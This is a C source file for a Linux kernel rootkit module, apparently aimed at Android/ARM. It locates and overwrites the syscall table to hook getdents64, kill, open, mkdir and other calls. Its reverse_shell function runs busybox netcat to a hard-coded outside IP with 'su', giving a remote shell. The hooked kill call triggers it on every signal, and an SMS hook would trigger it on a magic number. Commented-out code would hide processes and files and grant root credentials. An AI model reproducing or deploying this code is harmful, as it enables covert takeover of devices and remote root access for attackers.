#include <linux/init_task.h> 
#include <linux/kernel.h> 
#include <linux/module.h> 
#include <linux/sched.h> 
#include <linux/unistd.h> 
#include <linux/dirent.h>

#define AUTHOR "Hitesh Dharmdasani <hdharmda@gmu.edu>"
#define DESCRIPTION "This rookit is developed to intercept the following calls\n \\
						- SYS_WRITE  \n \\
						- SYS_CREAT  \n \\
						- SYS_MKDIR  \n \\
						- SYS_RMDIR  \n \\
						- SYS_KILL  \n \\
						- SYS_OPEN  \n \\ 
						- SYS_CLOSE  \n \\
						- sys_getdents64  \n \\
						"

MODULE_LICENSE("GPL");
MODULE_AUTHOR(AUTHOR);
MODULE_DESCRIPTION(DESCRIPTION);

#define __NR_GETUID 199
#define __NR_WRITEV 146
#define __NR_KILL 37
#define __NR_GETDENTS64 217

#define __NR_EXECVE 11
#define __NR_MKDIR 39
#define __NR_RMDIR 40
#define __NR_READ 3
#define __NR_WRITE 4
#define __NR_OPEN 5
#define __NR_CLOSE 6
#define __NR_CREAT 8

static void **sys_call_table;
int comm_offset=0;
int cred_offset=0;
int pid_offset=0;
int parent_offset=0;
int next_offset=0;
int start_chk=0;

struct cred_struct {
	int usage;
	int uid;	/* real UID of the task */
	int gid;	/* real GID of the task */
	int suid;	/* saved UID of the task */
	int sgid;	/* saved GID of the task */
	int euid;	/* effective UID of the task */
	int egid;	/* effective GID of the task */
	int fsuid;	/* UID for VFS ops */
	int fsgid;	/* GID for VFS ops */
};

asmlinkage long (*orig_getdents64)(unsigned int fd,struct linux_dirent64 __user *dirent,unsigned int count);
asmlinkage ssize_t (*orig_read) (int fd, char *buf, size_t count);
asmlinkage ssize_t (*orig_write) (int fd, char *buf, size_t count);
asmlinkage long (*orig_mkdir)(const char __user *pathname, umode_t mode);
asmlinkage long (*orig_rmdir)(const char __user *pathname);
asmlinkage ssize_t (*orig_open) (const char *pathname, int flags);
asmlinkage ssize_t (*orig_close) (int fd);
asmlinkage long (*orig_creat) (const char __user *pathname, umode_t mode);
asmlinkage long (*orig_execve)(const char __user *filename,const char __user *const __user *argv,const char __user *const __user *envp);
asmlinkage int (*orig_kill)(pid_t pid, int sig);
asmlinkage ssize_t (*orig_writev)(int fd,struct iovec *vector,int count);
//asmlinkage int (*orig_getdents64)(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
asmlinkage uid_t (*orig_getuid)(void);

void get_sys_call_table(){
	void *swi_addr=(long *)0xffff0008;
	unsigned long offset=0;
	unsigned long *vector_swi_addr=0;

	offset=((*(long *)swi_addr)&0xfff)+8;
	vector_swi_addr=*(unsigned long *)(swi_addr+offset);

	while(vector_swi_addr++){
		if(((*(unsigned long *)vector_swi_addr)&0xfffff000)==0xe28f8000){
			offset=((*(unsigned long *)vector_swi_addr)&0xfff)+8;
			sys_call_table=(void *)vector_swi_addr+offset;
			break;
		}
	}
	return;
}

void find_offset(){
	unsigned char *init_task_ptr=(char *)&init_task;
	int offset=0,i;
	char *ptr=0;

	/* getting the position of comm offset within task_struct structure */
	for(i=0;i<0x600;i++){
		if(init_task_ptr[i]=='s'&&init_task_ptr[i+1]=='w'&&init_task_ptr[i+2]=='a'&&
		init_task_ptr[i+3]=='p'&&init_task_ptr[i+4]=='p'&&init_task_ptr[i+5]=='e'&&
		init_task_ptr[i+6]=='r'){
			comm_offset=i;
			break;
		}
	}
	/* getting the position of tasks.next offset within task_struct structure */
	init_task_ptr+=0x50;
	for(i=0x50;i<0x300;i+=4,init_task_ptr+=4){
		offset=*(long *)init_task_ptr;
		if(offset&&offset>0xc0000000){
			offset-=i;
			offset+=comm_offset;
			if(strcmp((char *)offset,"init")){
				continue;
			} else {
				next_offset=i;
				/* getting the position of parent offset 
				   within task_struct structure */
				for(;i<0x300;i+=4,init_task_ptr+=4){
					offset=*(long *)init_task_ptr;
					if(offset&&offset>0xc0000000){
						offset+=comm_offset;
						if(strcmp((char *)offset,"swapper")){
							continue;
						} else {
							parent_offset=i+4;
							break;
						}
					}
				}
				break;
			}
		}
	}
	/* getting the position of cred offset within task_struct structure */
	init_task_ptr=(char *)&init_task;
	init_task_ptr+=comm_offset;
	for(i=0;i<0x50;i+=4,init_task_ptr-=4){
		offset=*(long *)init_task_ptr;
		if(offset&&offset>0xc0000000&&offset<0xd0000000&&offset==*(long *)(init_task_ptr-4)){
			ptr=(char *)offset;
			if(*(long *)&ptr[4]==0&&*(long *)&ptr[8]==0&&
				*(long *)&ptr[12]==0&&*(long *)&ptr[16]==0&&
				*(long *)&ptr[20]==0&&*(long *)&ptr[24]==0&&
				*(long *)&ptr[28]==0&&*(long *)&ptr[32]==0){
				cred_offset=i;
				break;
			}
		}
	}
	/* getting the position of pid offset within task_struct structure */
	pid_offset=parent_offset-0xc;
	return;
}

asmlinkage uid_t our_getuid(void){
	/*char *ptr=(char *)current;
	char *comm=ptr+comm_offset;
	unsigned long cred_ptr=*(int *)(comm-cred_offset);
	struct cred_struct *cred=(struct cred_struct *)cred_ptr;

	if(start_chk==0){
		list_del_init( &__this_module.list );
		start_chk++;
	}
	*/printk("Running our_getuid");
	/*if(cred->uid==DEF_GID){ // hidden id 
		cred->uid=0; cred->euid=0; cred->suid=0; cred->fsuid=0;
		cred->gid=DEF_GID; // hidden 
		cred->egid=0; cred->sgid=0; cred->fsgid=0;
		return 0;
	} */
	return (*orig_getuid)();
} 

asmlinkage ssize_t our_read (int fd, char *buf, size_t count)
{
        printk (KERN_INFO "SYS_READ: %s\n",buf);
        return orig_read(fd,buf,count);
}
asmlinkage ssize_t our_write (int fd, char *buf, size_t count)
{
        printk (KERN_INFO "SYS_WRITE: %s\n",buf);
        return orig_write(fd,buf,count);
}
asmlinkage ssize_t our_creat (const char __user *pathname, umode_t mode)
{
        printk (KERN_INFO "SYS_CREAT %s\n",pathname);
        return orig_creat(pathname,mode);
}
asmlinkage ssize_t our_mkdir (const char __user *pathname, umode_t mode)
{
        printk (KERN_INFO "SYS_MKDIR %s\n",pathname);
        return orig_mkdir(pathname,mode);
}
asmlinkage ssize_t our_rmdir (const char __user *pathname)
{
        printk (KERN_INFO "SYS_RMDIR %s\n",pathname);
        return orig_rmdir(pathname);
}

asmlinkage ssize_t our_close(int fd) 
{
        printk(KERN_INFO "SYS_CLOSE %s\n",current->comm);
        return orig_close(fd);
}

asmlinkage int our_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count){
	struct linux_dirent64 *td1,*td2;
	long ret,tmp;
	unsigned long hpid;
	int mover,process;

	ret=(*orig_getdents64)(fd,dirp,count);
	
	if(!ret) 
		return ret;
	
	td2=(struct linux_dirent64 *)kmalloc(ret,GFP_KERNEL);
	copy_from_user(td2,dirp,ret);

	td1=td2;
	tmp=ret;
    hpid=simple_strtoul(td1->d_name,NULL,10);
    printk("our_getdents64: %u",hpid);
	tmp-=td1->d_reclen;
	if(td1->d_name) {
		printk("Intercepting %s",td1->d_name);
	}
	
	 /* 
	td2=(struct linux_dirent64 *)kmalloc(ret,GFP_KERNEL);
	copy_from_user(td2,dirp,ret);

	td1=td2;
	tmp=ret;

	while(tmp>0){
		tmp-=td1->d_reclen;
		mover=1;
		process=0;
		hpid=0;

		hpid=simple_strtoul(td1->d_name,NULL,10);
		if(hpid!=0){
			char *init_task_ptr=(char *)&init_task;
			char *comm=init_task_ptr+comm_offset;
			unsigned long cred_ptr=*(int *)(comm-cred_offset);
			struct cred_struct *cred=(struct cred_struct *)cred_ptr;
			int pid_v=*(int *)(init_task_ptr+pid_offset);
			char *next_ptr=(char *)(*(long *)(init_task_ptr+next_offset))-next_offset;

			do{
				comm=next_ptr+comm_offset;
				pid_v=*(int *)(next_ptr+pid_offset);
				cred_ptr=*(int *)(comm-cred_offset);
				cred=(struct cred_struct *)cred_ptr;
				if(pid_v==hpid){
					if(cred->gid==DEF_GID||strstr(comm,DEF_HIDE)){
						process=1;
					}
					break;
				}
			} while ((next_ptr=(char *)(*(long *)(next_ptr+next_offset))-next_offset)!=init_task_ptr);
		}

		if(process||strstr(td1->d_name,DEF_HIDE)){
			ret-=td1->d_reclen;
			mover=0;
			if(tmp){
				memmove(td1,(char *)td1+td1->d_reclen,tmp);
			}
		}
		if(tmp&&mover){
			td1=(struct linux_dirent64 *)((char *)td1+td1->d_reclen);
		}
	}
	copy_to_user((void *)dirp,(void *)td2,ret);
	kfree(td2);
	*/
	copy_to_user((void *)dirp,(void *)td2,ret);
	kfree(td2);
	return ret;
} 

/* trustwave mindtrick rootkit's example */
void reverse_shell()
{
	static char *path="rshell";
	char *argv[]={"busybox","nc","169.228.66.210","8282","-e","su","app_8282",NULL};
	static char *envp[]={"HOME=/","PATH=/sbin:/system/sbin:/system/bin:/system/xbin",NULL};

	call_usermodehelper(path,argv,envp,1);
}
	
asmlinkage int our_kill(pid_t pid, int sig)
{
				reverse_shell();
	printk(KERN_INFO "SYS_KILL: %d\n",pid);
	// char *init_task_ptr=(char *)&init_task;
	// char *comm=init_task_ptr+comm_offset;
	// unsigned long cred_ptr=*(int *)(comm-cred_offset);
	// struct cred_struct *cred=(struct cred_struct *)cred_ptr;
	// int pid_v=*(int *)(init_task_ptr+pid_offset);
	// char *next_ptr=(char *)(*(long *)(init_task_ptr+next_offset))-next_offset;

	// if(sig==82){
	// 	do{
	// 		comm=next_ptr+comm_offset;
	// 		pid_v=*(int *)(next_ptr+pid_offset);
	// 		cred_ptr=*(int *)(comm-cred_offset);
	// 		cred=(struct cred_struct *)cred_ptr;

	// 		if(pid==pid_v){
	// 			cred->uid=0; cred->euid=0; cred->suid=0; cred->fsuid=0;
	// 			cred->gid=DEF_GID; // hidden 
	// 			cred->egid=0; cred->sgid=0; cred->fsgid=0;
	// 			break;
	// 		}
	// 	} while ((next_ptr=(char *)(*(long *)(next_ptr+next_offset))-next_offset)!=init_task_ptr);
	// 	return 0;
	// }
	return (*orig_kill)(pid,sig); 
} 

asmlinkage ssize_t our_writev(int fd,struct iovec *vector,int count)
{
	char *ptr=(char *)current;
	char *comm=ptr+comm_offset;
	int i=0;

	if(strstr(comm,"SmsReceiverServ")){
		for(i=0;i<count;i++,vector++){
			if(strstr((char *)vector->iov_base,"0000")){ /* magic phone number */
				printk("sms receive\n");
				reverse_shell();
			}
		}
	}
	return orig_writev(fd,vector,count);
}


asmlinkage ssize_t our_open(const char *pathname, int flags) 
{
	printk(KERN_INFO "SYS_OPEN: %s\n",pathname);
	return orig_open(pathname,flags);
}

asmlinkage long our_execve(const char __user *filename,const char __user *const __user *argv, const char __user *const __user *envp)
{
	printk(KERN_INFO "SYS_EXECVE: %s\n",filename);
	return orig_execve(filename,argv,envp);
}

int init_module(void) 
{
	// Need to copy module to kernel boot time module list

	find_offset();
	get_sys_call_table();

	// Get address of sys_calls and store good copy
	orig_getdents64 = sys_call_table[__NR_GETDENTS64];
	orig_kill = sys_call_table[__NR_KILL];
	orig_close = sys_call_table[__NR_CLOSE];
	orig_open = sys_call_table[__NR_OPEN];
	orig_creat = sys_call_table[__NR_CREAT];
	orig_rmdir = sys_call_table[__NR_RMDIR];
	orig_mkdir = sys_call_table[__NR_MKDIR];
	orig_getuid = sys_call_table[__NR_GETUID];
	// orig_execve = sys_call_table[__NR_EXECVE];

	// Overwrite sys_call_table with our versions of sys_calls
	sys_call_table[__NR_GETDENTS64] = our_getdents64;
	sys_call_table[__NR_MKDIR] = our_mkdir;
	sys_call_table[__NR_RMDIR] = our_rmdir;
	sys_call_table[__NR_CREAT] = our_creat;
	sys_call_table[__NR_CLOSE] = our_close;
	sys_call_table[__NR_KILL] = our_kill;
	sys_call_table[__NR_OPEN] = our_open;
	sys_call_table[__NR_GETUID] = our_getuid;
	// sys_call_table[__NR_EXECVE] = our_execve;
	
	return 0; 
}

void cleanup_module(void) 
{ 
	// Need to un-load cleanly. Write peristence into file with read-only access to reload.

	;
}

/* eoc */
 
